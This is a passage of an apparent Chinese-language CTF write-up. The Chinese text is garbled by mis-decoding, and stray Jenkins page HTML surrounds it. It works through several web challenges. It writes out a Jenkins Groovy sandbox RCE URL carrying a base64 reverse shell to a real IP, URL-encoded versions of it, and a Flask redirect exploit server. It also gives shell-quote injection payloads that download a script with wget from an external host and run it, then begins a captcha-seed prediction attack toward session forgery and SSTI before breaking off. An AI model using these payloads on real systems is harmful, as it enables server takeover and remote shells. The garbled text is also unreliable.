in&lt;/b&gt;&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;searchbox hidden-xs&quot;&gt;&lt;form method=&quot;get&quot; name=&quot;search&quot; action=&quot;/search/&quot; style=&quot;position:relative;&quot; class=&quot;no-json&quot;&gt;&lt;div id=&quot;search-box-minWidth&quot;&gt;&lt;/div&gt;&lt;div id=&quot;search-box-sizer&quot;&gt;&lt;/div&gt;&lt;div id=&quot;searchform&quot;&gt;&lt;input name=&quot;q&quot; placeholder=&quot;search&quot; id=&quot;search-box&quot; class=&quot;has-default-text&quot; /&gt; &lt;a href=&quot;https://jenkins.io/redirect/search-box&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/16x16/help.png&quot; style=&quot;width: 16px; height: 16px; &quot; class=&quot;icon-help icon-sm&quot; /&gt;&lt;/a&gt;&lt;div id=&quot;search-box-completion&quot;&gt;&lt;/div&gt;&lt;script&gt;createSearchBox(&quot;/search/&quot;);&lt;/script&gt;&lt;/div&gt;&lt;/form&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;breadcrumbBar&quot;&gt;&lt;tr id=&quot;top-nav&quot;&gt;&lt;td id=&quot;left-top-nav&quot; colspan=&quot;2&quot;&gt;&lt;link rel=&#x27;stylesheet&#x27; href=&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.css&#x27; type=&#x27;text/css&#x27; /&gt;&lt;script src=&#x27;/adjuncts/e1c81722/lib/layout/breadcrumbs.js&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt;&lt;div class=&quot;top-sticker noedge&quot;&gt;&lt;div class=&quot;top-sticker-inner&quot;&gt;&lt;div id=&quot;right-top-nav&quot;&gt;&lt;div id=&quot;right-top-nav&quot;&gt;&lt;div class=&quot;smallfont&quot;&gt;&lt;a href=&quot;?auto_refresh=true&quot;&gt;ENABLE AUTO REFRESH&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;ul id=&quot;breadcrumbs&quot;&gt;&lt;li class=&quot;item&quot;&gt;&lt;a href=&quot;/&quot; class=&quot;model-link inside&quot;&gt;Jenkins&lt;/a&gt;&lt;/li&gt;&lt;li href=&quot;/&quot; class=&quot;children&quot;&gt;&lt;/li&gt;&lt;/ul&gt;&lt;div id=&quot;breadcrumb-menu-target&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;page-body&quot; class=&quot;clear&quot;&gt;&lt;div id=&quot;side-panel&quot;&gt;&lt;div id=&quot;tasks&quot;&gt;&lt;div class=&quot;task&quot;&gt;&lt;a href=&quot;/asynchPeople/&quot; class=&quot;task-icon-link&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/24x24/user.png&quot; style=&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot; class=&quot;icon-user icon-md&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;/asynchPeople/&quot; class=&quot;task-link&quot;&gt;People&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;task&quot;&gt;&lt;a href=&quot;/view/all/builds&quot; class=&quot;task-icon-link&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/24x24/notepad.png&quot; style=&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot; class=&quot;icon-notepad icon-md&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;/view/all/builds&quot; class=&quot;task-link&quot;&gt;Build History&lt;/a&gt;&lt;/div&gt;&lt;div class=&quot;task&quot;&gt;&lt;a href=&quot;/credentials&quot; class=&quot;task-icon-link&quot;&gt;&lt;img src=&quot;/static/e1c81722/plugin/credentials/images/24x24/credentials.png&quot; style=&quot;width: 24px; height: 24px; width: 24px; height: 24px; margin: 2px;&quot; class=&quot;icon-credentials-credentials icon-md&quot; /&gt;&lt;/a&gt; &lt;a href=&quot;/credentials&quot; class=&quot;task-link&quot;&gt;Credentials&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div id=&quot;buildQueue&quot; class=&quot;container-fluid pane-frame track-mouse expanded&quot;&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;col-xs-24 pane-header&quot;&gt;&lt;a href=&quot;/toggleCollapse?paneId=buildQueue&quot; title=&quot;collapse&quot; class=&quot;collapse&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/16x16/collapse.png&quot; alt=&quot;collapse&quot; style=&quot;width: 16px; height: 16px; &quot; class=&quot;icon-collapse icon-sm&quot; /&gt;&lt;/a&gt;Build Queue&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;row pane-content&quot;&gt;&lt;table class=&quot;pane &quot;&gt;&lt;script src=&#x27;/adjuncts/e1c81722/lib/form/link/link.js&#x27; type=&#x27;text/javascript&#x27;&gt;&lt;/script&gt;&lt;tr&gt;&lt;td class=&quot;pane&quot; colspan=&quot;2&quot;&gt;No builds in the queue.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=&quot;defer&quot;&gt;refreshPart(&#x27;buildQueue&#x27;,&quot;/ajaxBuildQueue&quot;);&lt;/script&gt;&lt;div id=&quot;executors&quot; class=&quot;container-fluid pane-frame track-mouse expanded&quot;&gt;&lt;div class=&quot;row&quot;&gt;&lt;div class=&quot;col-xs-24 pane-header&quot;&gt;&lt;a href=&quot;/toggleCollapse?paneId=executors&quot; title=&quot;collapse&quot; class=&quot;collapse&quot;&gt;&lt;img src=&quot;/static/e1c81722/images/16x16/collapse.png&quot; alt=&quot;collapse&quot; style=&quot;width: 16px; height: 16px; &quot; class=&quot;icon-collapse icon-sm&quot; /&gt;&lt;/a&gt;&lt;a href=&#x27;/computer/&#x27;&gt;Build Executor Status&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&quot;row pane-content&quot;&gt;&lt;table class=&quot;pane &quot;&gt;&lt;colgroup&gt;&lt;col width=&quot;30&quot; /&gt;&lt;col width=&quot;200*&quot; /&gt;&lt;col width=&quot;24&quot; /&gt;&lt;/colgroup&gt;&lt;tr&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;pane&quot; align=&quot;right&quot; style=&quot;vertical-align: top&quot;&gt;1&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;Idle&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&quot;pane&quot; align=&quot;right&quot; style=&quot;vertical-align: top&quot;&gt;2&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;Idle&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;td class=&quot;pane&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;&lt;/div&gt;&lt;script defer=&quot;defer&quot;&gt;refreshPart(&#x27;executors&#x27;,&quot;/ajaxExecutors&quot;);&lt;/script&gt;&lt;/div&gt;&lt;div id=&quot;main-panel&quot;&gt;&lt;a name=&quot;skip çœ‹åˆ° jenkins ç‰ˆæœ¬ä¸º 2.138, åˆ«é—®ğŸ‘´æ€ä¹ˆçœ‹åˆ°çš„ï¼Œä½ å’‹é‚£ä¹ˆå¤šäº‹å‘¢ğŸ˜¡ https://www.cnblogs.com/cute-puli/p/15378440.html 1http://x.x.x.x:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public%20class%20x%20&#123;public%20x()&#123;%22å‘½ä»¤æ›¿æ¢%22.execute()&#125;&#125; æ‰“è¿™ä¸ªå‘½ä»¤ 1http://jenkins:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x &#123;public x()&#123;&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xNDMuMTkyLjE5LzExNDUgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;.execute()&#125;&#125; å…ˆæŠŠ value çš„å€¼ url ç¼–ç ï¼Œç„¶åæŠŠæ•´ä¸ªé‡å®šå‘ç½‘å€ url ç¼–ç ï¼Œ 1http://jenkins:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%20%20%20%20%22%62%61%73%68%20%2d%63%20%7b%65%63%68%6f%2c%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%30%4d%79%34%78%4e%44%4d%75%4d%54%6b%79%4c%6a%45%35%4c%7a%45%78%4e%44%55%67%4d%44%34%6d%4d%51%3d%3d%7d%7c%7b%62%61%73%65%36%34%2c%2d%64%7d%7c%7b%62%61%73%68%2c%2d%69%7d%22%2e%65%78%65%63%75%74%65%28%29%0a%20%20%7d%0a%7d 1%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3d%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%36%33%25%36%63%25%36%31%25%37%33%25%37%33%25%32%30%25%37%38%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%37%38%25%32%38%25%32%39%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%32%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%33%25%32%30%25%37%62%25%36%35%25%36%33%25%36%38%25%36%66%25%32%63%25%35%39%25%36%64%25%34%36%25%37%61%25%36%31%25%34%33%25%34%31%25%37%34%25%36%31%25%35%33%25%34%31%25%32%62%25%34%61%25%36%39%25%34%31%25%37%36%25%35%61%25%34%37%25%35%36%25%33%32%25%34%63%25%33%33%25%35%32%25%36%61%25%36%33%25%34%33%25%33%38%25%33%30%25%34%64%25%37%39%25%33%34%25%37%38%25%34%65%25%34%34%25%34%64%25%37%35%25%34%64%25%35%34%25%36%62%25%37%39%25%34%63%25%36%61%25%34%35%25%33%35%25%34%63%25%37%61%25%34%35%25%37%38%25%34%65%25%34%34%25%35%35%25%36%37%25%34%64%25%34%34%25%33%34%25%36%64%25%34%64%25%35%31%25%33%64%25%33%64%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%63%25%32%64%25%36%34%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%38%25%32%63%25%32%64%25%36%39%25%37%64%25%32%32%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%37%35%25%37%34%25%36%35%25%32%38%25%32%39%25%30%61%25%32%30%25%32%30%25%37%64%25%30%61%25%37%64 æœ€ç»ˆ exp,ğŸ‘´ã®æœ€å¾Œã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆ (exloit) 1234567from flask import Flask,redirectapp = Flask(__name__)@app.route(&#x27;/evil&#x27;, methods=[&#x27;POST&#x27;])def evil(): return redirect(&quot;http://124.70.33.170:8088/redirect?redirect_url=%68%74%74%70%3a%2f%2f%6a%65%6e%6b%69%6e%73%3a%38%30%38%30%2f%73%65%63%75%72%69%74%79%52%65%61%6c%6d%2f%75%73%65%72%2f%61%64%6d%69%6e%2f%64%65%73%63%72%69%70%74%6f%72%42%79%4e%61%6d%65%2f%6f%72%67%2e%6a%65%6e%6b%69%6e%73%63%69%2e%70%6c%75%67%69%6e%73%2e%73%63%72%69%70%74%73%65%63%75%72%69%74%79%2e%73%61%6e%64%62%6f%78%2e%67%72%6f%6f%76%79%2e%53%65%63%75%72%65%47%72%6f%6f%76%79%53%63%72%69%70%74%2f%63%68%65%63%6b%53%63%72%69%70%74%3f%73%61%6e%64%62%6f%78%3d%74%72%75%65%26%76%61%6c%75%65%3d%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%36%33%25%36%63%25%36%31%25%37%33%25%37%33%25%32%30%25%37%38%25%32%30%25%37%62%25%30%61%25%32%30%25%32%30%25%37%30%25%37%35%25%36%32%25%36%63%25%36%39%25%36%33%25%32%30%25%37%38%25%32%38%25%32%39%25%37%62%25%30%61%25%32%30%25%32%30%25%32%30%25%32%30%25%32%32%25%36%32%25%36%31%25%37%33%25%36%38%25%32%30%25%32%64%25%36%33%25%32%30%25%37%62%25%36%35%25%36%33%25%36%38%25%36%66%25%32%63%25%35%39%25%36%64%25%34%36%25%37%61%25%36%31%25%34%33%25%34%31%25%37%34%25%36%31%25%35%33%25%34%31%25%32%62%25%34%61%25%36%39%25%34%31%25%37%36%25%35%61%25%34%37%25%35%36%25%33%32%25%34%63%25%33%33%25%35%32%25%36%61%25%36%33%25%34%33%25%33%38%25%33%30%25%34%64%25%37%39%25%33%34%25%37%38%25%34%65%25%34%34%25%34%64%25%37%35%25%34%64%25%35%34%25%36%62%25%37%39%25%34%63%25%36%61%25%34%35%25%33%35%25%34%63%25%37%61%25%34%35%25%37%38%25%34%65%25%34%34%25%35%35%25%36%37%25%34%64%25%34%34%25%33%34%25%36%64%25%34%64%25%35%31%25%33%64%25%33%64%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%63%25%32%64%25%36%34%25%37%64%25%37%63%25%37%62%25%36%32%25%36%31%25%37%33%25%36%38%25%32%63%25%32%64%25%36%39%25%37%64%25%32%32%25%32%65%25%36%35%25%37%38%25%36%35%25%36%33%25%37%35%25%37%34%25%36%35%25%32%38%25%32%39%25%30%61%25%32%30%25%32%30%25%37%64%25%30%61%25%37%64&quot;,code=302)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=7777) å“ˆå“ˆå“ˆå“ˆå“ˆï¼æ¬ºéª—ä¸–ç•Œè¿™ç§äº‹æƒ…ï¼Œå¯¹äºğŸ‘´æ¥è¯´ï¼Œç®€ç›´å°èœä¸€ç¢Ÿ. ã‚ãŸã—ã¯å¼·ã„ ã‚ãªãŸãŸã¡ã‚ˆã‚Šå¼·ã„ï¼ è¿™ä¸€åˆ‡éƒ½æ˜¯å‘½è¿çŸ³ä¹‹é—¨çš„é€‰æ‹©ï¼ ~Ave Mujicaâ€™s Masquerade~ ã€ŒãŠå¹¸ã›ã«ã€, å¸Œå•Šå“‡èµ›ä½ å¦¹çš„ï¼ŒğŸ‘´å¾ˆğŸ˜¡ğŸ˜¡. æºç ï¼Œå†²ğŸ˜“ 12345678910111213141516171819202122232425262728293031323334353637app.get(&#x27;/checker&#x27;, (req, res) =&gt; &#123; let url = req.query.url; if (url) &#123; let host; let port; // MakE it Safer!!!!! if (url.includes(&quot;:&quot;)) &#123; const parts = url.split(&quot;:&quot;); host = parts[0]; port = parts.slice(1).join(&quot;:&quot;); &#125; else &#123; host = url; &#125; if (port) &#123; command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); // Construct the shell command &#125; else &#123; command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, &quot;80&quot;, host]); &#125; nmap = spawn(&quot;bash&quot;, [&quot;-c&quot;, command]); console.log(command); nmap.on(&#x27;exit&#x27;, function (code) &#123; console.log(&#x27;child process exited with code &#x27; + code.toString()); if (code !== 0) &#123; res.send(`Error executing command!!!`); &#125; else &#123; res.send(`Ok...`); &#125; &#125;); &#125; else &#123; res.send(&#x27;No parameter provided.&#x27;); &#125;&#125;); ä¸å¤š bb, å°±æ˜¯æ‰“è¿™ä¸ª checker è·¯ç”±. ğŸ‘´è§‰å¾— shellQuote,quote å¾ˆé™Œç”Ÿï¼Œå¾ˆä¸å¯¹åŠ²ï¼Œæ€ä¹ˆåŠï¼Œæœ exp! åˆ«è·ŸğŸ‘´è¯´ä½ ä¸ä¼šæœï¼Œnmd ä¸è¦ç”¨å›½å†…çš„ç­”è¾©å¼•æ“ï¼Œä¸ŠğŸ¥ğŸ•Šç›´æ¥:shellQuote exploit ç¬¬ä¸€ä¸ªå°±æ˜¯äº†ï¼Œå…¶å®ƒéƒ½ä¸å¥½ä½¿:Exploiting CVE-2021-42740 (wh0.github.io) ä¸è¯´äººè¯:shell-quote åŒ…é€šå¸¸ç”¨äºè½¬ä¹‰ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œä»¥ä¾¿åœ¨ shell å‘½ä»¤ä¸­ä½¿ç”¨ã€‚æ­¤ç¤ºä¾‹é‡‡ç”¨ä¸å—ä¿¡ä»»çš„è¾“å…¥ï¼Œå¼•ç”¨å®ƒï¼Œå¹¶é€šè¿‡ä¸€ä¸ªå‘½ä»¤è¿è¡Œå®ƒï¼Œè¯¥å‘½ä»¤å°†å…¶æ‰“å°å‡ºæ¥ã€‚æˆ‘ä»¬åªå¸Œæœ›å®ƒè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œè€Œä¸æ˜¯å…è®¸ä¸å—ä¿¡ä»»çš„è¾“å…¥è¿è¡Œä»»æ„å‘½ä»¤ã€‚å‡è®¾æˆ‘ä»¬åœ¨è·¯å¾„ä¸­è°ƒç”¨ pwnme äº†è¿™ä¸ªç¨‹åºï¼Œå¦‚æœå®ƒè¢«æ‰§è¡Œï¼Œæˆ‘ä»¬å°±å¤±è´¥äº†æˆ‘ä»¬çš„å®‰å…¨ç›®æ ‡ï¼š æœ‰ç‚¹éš¾æ‡‚ï¼Œæ¥ä¸ª demo è¯•ä¸€ä¸‹. 1return String(s).replace(/([A-z]:)?([#!&quot;$&amp;&#x27;()*,:;&lt;=&gt;?@\\[\\\\\\]^`&#123;|&#125;])/g, &#x27;$1\\\\$2&#x27;); æœ€å¥½åœ¨è™šæ‹Ÿæœºä¸Šç”¨ï¼Œtest.js å¦‚ä¸‹ 12345678const childProcess = require(&#x27;child_process&#x27;);const shellQuote = require(&#x27;shell-quote&#x27;);const untrusted = process.argv[2];console.log(&#x27;untrusted&#x27;, untrusted);const result = childProcess.execSync(shellQuote.quote([&#x27;printf&#x27;, &#x27;%s\\n&#x27;, untrusted]));console.log(&#x27;result&#x27;, result); 1node test.js &#x27;`:`./pwnme``:`&#x27; è¿™é‡Œçš„ 1&#x27;`:`pwnme``:`&#x27; ç›¸å½“äº untrsuted,ğŸ‘´ç›´æ¥å°±è¯´äº†. pwnme è¾“å…¥ 123#!/bin/shtouch /tmp/i-am-pwnedecho &quot;oh no&quot; è¾“å…¥å‘½ä»¤ 1node test.js &#x27;`:`./pwnme``:`&#x27; ç›´æ¥å°±èƒ½æ‰§è¡Œ pwnme é‡Œé¢çš„å†…å®¹äº† ç©ºæ ¼è¢« ban æ€ä¹ˆåŠï¼Œç”¨ $IFS, åˆ«è¿™ä¹Ÿè¦ğŸ‘´æ•™. ä½ ç°åœ¨æ˜ç™½äº†æ€ä¹ˆç»˜ä¸–äº†. 1command = shellQuote.quote([&quot;nmap&quot;, &quot;-p&quot;, port, host]); ç°åœ¨ä¹Ÿå°±æ˜¯è¦æ§åˆ¶ port äº† 1&quot;127.0.0.1:`:`wget$IFS``:` $IFS 1%20%09%0A%00%0A $9 1%09 å…ˆä¸‹è½½ 1http://124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`wget$IFS$943.143.192.19:7777/a.sh``:` æŠ¥é”™å¹¶æ— å…³ç³»ï¼Œå·²ç»æ‰§è¡ŒåŠ›. å†æ‰§è¡Œ 1http://124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS$9a.sh``:` èŠœæ¹–ï¼Œå¥¥åˆ©å®‰è´¹ï¼Œå¤ª tm çˆ½äº†. ğŸ‘´é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œç”¨æ–œæ ä¹Ÿèƒ½ç»•è¿‡ 1http://124.70.33.170:24001/checker?url=&quot;127.0.0.0:`:`bash$IFS\\a.sh``:` story ã“ã‚Œã¯ã€ã‚ãŸã—ã®ç‰©èªğŸ¤£,wcsndm é¢˜ç›®ç¯å¢ƒæ²¡äº†ï¼Œè‡ªå·±æœ¬åœ°æ­ docker. ä¸è¿‡é—®é¢˜ä¸å¤§ï¼Œå› ä¸ºğŸ‘´é­”æ”¹äº†ä¸€ä¸‹æºç ï¼Œä¸€æ ·èƒ½å’Œé¢˜ç›®æ•ˆæœå·®ä¸å¤š 1app.config[&#x27;SECRET_KEY&#x27;] = str(uuid.uuid4()) ä¸ºäº†ä¿è¯é¢˜ç›®å¯†é’¥çš„éšæœºæ€§ï¼ŒğŸ‘´æ”¹æˆäº†è¿™ b ç©æ„ï¼ŒğŸ‘´å¯å¤ª nb äº† ä¸å¤š bb, å…ˆä¸Šæºç ï¼Œè®©ğŸ‘´æ¥çœ‹çœ‹æ€ä¹ˆä¸ªäº‹ğŸ˜Š æºç ğŸ¤” 12345678910111213141516171819202122232425262728293031323334353637383940def captcha(): gen = Captcha(200, 80) buf , captcha_text = gen.generate() session[&#x27;captcha&#x27;] = captcha_text return buf.getvalue(), 200, &#123; &#x27;Content-Type&#x27;: &#x27;image/png&#x27;, &#x27;Content-Length&#x27;: str(len(buf.getvalue())) &#125; @app.route(&#x27;/vip&#x27;, methods=[&#x27;POST&#x27;])def vip(): captcha = generate_code() captcha_user = request.json.get(&#x27;captcha&#x27;, &#x27;&#x27;) if captcha == captcha_user: session[&#x27;vip&#x27;] = True return render_template(&quot;home.html&quot;)@app.route(&#x27;/story&#x27;, methods=[&#x27;GET&#x27;])def story(): story = session.get(&#x27;story&#x27;,&#x27;&#x27;) if story is not None and story != &quot;&quot;: tpl = open(&#x27;templates/story.html&#x27;, &#x27;r&#x27;).read() return render_template_string(tpl % story) return redirect(&quot;/&quot;) @app.route(&#x27;/write&#x27;, methods=[&#x27;POST&#x27;,&#x27;GET&#x27;])def rename(): if request.method == &quot;GET&quot;: return redirect(&#x27;/&#x27;) story = request.json.get(&#x27;story&#x27;, &#x27;&#x27;) if session.get(&#x27;vip&#x27;, &#x27;&#x27;): if not minic_waf(story): session[&#x27;username&#x27;] = &quot;&quot; session[&#x27;vip&#x27;] = False return jsonify(&#123;&#x27;status&#x27;: &#x27;error&#x27;, &#x27;message&#x27;: &#x27;no way~~~&#x27;&#125;) session[&#x27;story&#x27;] = story return jsonify(&#123;&#x27;status&#x27;: &#x27;success&#x27;, &#x27;message&#x27;: &#x27;success&#x27;&#125;) return jsonify(&#123;&#x27;status&#x27;: &#x27;error&#x27;, &#x27;message&#x27;: &#x27;Please become a VIP first.&#x27;&#125;), 400 ğŸ‘´åªæ”¾äº†ä¸‰ä¸ªè·¯ç”±ï¼Œä¸æ˜¯æ‡’ï¼Œè€Œæ˜¯æ²¡æœ‰å¿…è¦ï¼Œä½ ç”¨ä¸ç€è¿™ä¹ˆå¤šäº†ğŸ¤£ å¾ˆæ˜æ˜¾ï¼Œæœ€ç»ˆåˆ©ç”¨ç‚¹å°±æ˜¯ story è·¯ç”±ä¸‹çš„ render_template_string, ä¼—æ‰€å‘¨çŸ¥ï¼Œè¿™æ˜¯ SSTI çš„è§¦å‘ç‚¹. ä½†æ˜¯å‚æ•°æ˜¯ä» session é‡Œé¢å–å‡ºæ¥çš„ï¼Œä½ èƒ½ä¼ªé€ å—ï¼Œé‚£æ€ä¹ˆè¯´ä¹Ÿå¾—æ‹¿åˆ° SECRET_KEY å•Šï¼Œæ€ä¹ˆæ‹¿åˆ°å‘¢ï¼Œé€šè¿‡ stroy è·¯ç”± sstiæ‹¿åˆ°ï¼Œé‚£æˆ‘æ€ä¹ˆ ssti, å…ˆä¼ªé€  session, é‚£æˆ‘æ€ä¹ˆä¼ªé€  session, å…ˆæ‹¿åˆ° SECRET_KEY, é‚£æˆ‘æ€ä¹ˆæ‹¿åˆ° SCECRET_KEY å‘¢ï¼Œå…ˆ sstiâ€¦ å‘çˆ¹å‘¢ï¼è¿™æ˜¯ï¼ŒğŸ˜“(bushi) å¥½å§ï¼Œæ­£è§£å…¶å®æ˜¯: é€šè¿‡ write è·¯ç”±å†™ session çš„ story, ä½†æ˜¯ write è·¯ç”±åˆ©ç”¨æœ‰ä¸ªæ¡ä»¶ï¼Œè¦ä¼ªé€  vip, é‚£æ€ä¹ˆä¼ªé€  vip, é‚£å¿…ç„¶æ˜¯å…ˆæ‹¿åˆ° SECRET_KEYâ€¦ æˆ‘è¯´å©·å©·ï¼Œæ‰“ä½ï¼Œæ²¡å®Œäº†æ˜¯å§ğŸ¤ª. vip è·¯ç”±ä¸‹èƒ½å¤Ÿè®©æˆ‘ä»¬ session ä¸­çš„ vip ä¸º true 1234567def vip(): captcha = generate_code() captcha_user = request.json.get(&#x27;captcha&#x27;, &#x27;&#x27;) if captcha == captcha_user: session[&#x27;vip&#x27;] = True return render_template(&quot;home.html&quot;)@app.route(&#x27;/story&#x27;, methods=[&#x27;GET&#x27;]) ä¸è¿‡æ¡ä»¶æ˜¯ generate_code ç­‰äºä¼ å…¥çš„ captcha, è€Œ generate_code çš„ç”Ÿæˆé€»è¾‘æ˜¯éšæœºçš„å››ä½ï¼Œè€Œä¸”æ¯è®¿é—®ä¸€æ¬¡éƒ½ä¼šå˜ï¼Œç›´æ¥çˆ†ç ´çš„äººå»ºè®®é­”æ³•æŠ«é£. æˆ‘çœ‹çœ‹è¿™ä¸ª captcha çš„ç”Ÿæˆæ˜¯æ€ä¹ˆä¸ªäº‹ 123def generate_code(length: int = 4): characters = &#x27;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27; return &#x27;&#x27;.join(random.choice(characters) for _ in range(length)) è¿™ç©ä¸ª p å•Šï¼Œéšæœºç”Ÿæˆï¼Œæˆ‘çœ‹çœ‹è¿™ä¸ª class æ€ä¹ˆä¸ªäº‹ 12345678910111213class Captcha: lookup_table: t.List[int] = [int(i * 1.97) for i in range(256)] def __init__(self, width: int = 160, height: int = 60, key: int = None, length: int = 4, fonts: t.Optional[t.List[str]] = None, font_sizes: t.Optional[t.Tuple[int]] = None): self._width = width self._height = height self._length = length self._key = (key or int(time.time())) + random.randint(1,100) self._fonts = fonts or DEFAULT_FONTS self._font_sizes = font_sizes or (42, 50, 56) self._truefonts: t.List[FreeTypeFont] = [] random.seed(self._key) å“¦ï¼ŒåŸæ¥æ˜¯æœ‰ç§å­çš„å‘€ï¼Œé‚£æ²¡äº‹äº† (nmsl). è¿™ç§å­æ˜¯å½“å‰æ—¶é—´æˆ³çš„å–è¯æ‹¼æ¥ 1 åˆ° 100 çš„éšæœºæ•°. æ˜¾ç„¶ time æˆ‘ä»¬å¯ä»¥è‡ªå·±æœ¬åœ°ç”Ÿæˆï¼Œ1 åˆ° 100 çš„éšæœºæ•°ï¼Œå‡¹æ¦‚ç‡ä½ ä¸ä¼šï¼Ÿçˆ†ç ´ä»–ä¸ªå‡ ç™¾ä¸Šåƒæ¬¡ï¼Œæ€»èƒ½ç»ˆå‡ºçš„. ç»ˆå‡ºä¸äº†ä¹Ÿåˆ«å¹²äº†ï¼Œæœºå™¨çˆ†ç ´è¿™ä¹ˆå¤šæ¬¡ï¼Œ1 åˆ° 100 æ€»å¾—ç»ˆå‡ºå§.ğŸ¥µ 12345678910def captcha(): gen = Captcha(200, 80) buf , captcha_text = gen.generate() session[&#x27;captcha&#x27;] = captcha_text return buf.getvalue(), 200, &#123; &#x27;Content-Type&#x27;: &#x27;image/png&#x27;, &#x27;Content-Length&#x27;: str(len(buf.getvalue())) &#125; @app.route(&#x27;/vip&#x27;, methods=[&#x27;POST&#x27;]) ä¸ºæ­¤æˆ‘ä»¬éœ€è¦è®¿é—® captcha, æ¯æ¬¡ä»¥å½“å‰æ—¶é—´æˆ³ + éšæœºæ•°ä¸ºç§å­é‡ç½®è¿™ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥è¦å…ˆè®¿é—® captch, å†è®¿é—® /vip. æµç¨‹æ˜¯ 1é‡ç½®Captchaå¯¹è±¡,ä»¥å½“å‰æ—¶é—´æˆ³åŠ 1è‡³100éšæœºæ•°-&gt;gen.generate()ç”Ÿæˆç¬¬ä¸€æ¬¡éšæœºæ•°-&gt;/vipè·¯ç”±è°ƒç”¨generate_codeéšæœºç”Ÿæˆ å› æ­¤ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦å¯¹è½´ 1234gen = Captcha(200, 80, int(time.time()) + random.randint(1, 100)) gen.generate() requests.get(url1 + &quot;captcha&quot;, headers=headers) é¦–å…ˆå®Œæˆè¿™äº›æ“ä½œï¼Œç„¶åè®¿é—® captcha è·¯ç”±ï¼Œæ­¤æ—¶è½´å¯¹ä¸Šäº† 1captcha = generate_code() æ¥ä¸‹æ¥ç”Ÿæˆä¸€æ¬¡ generate_code (), 